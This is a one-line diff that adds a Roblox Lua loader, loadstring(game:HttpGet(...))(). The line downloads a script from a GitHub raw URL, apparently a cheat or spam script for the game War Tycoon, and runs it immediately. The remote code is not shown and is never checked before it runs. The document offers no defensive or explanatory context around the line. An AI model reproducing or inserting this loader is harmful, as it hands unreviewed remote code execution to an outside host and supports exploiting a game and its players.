@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/kf-41-war-tycoon-spam6-wqppzoyrmd4z6o.lua"))()
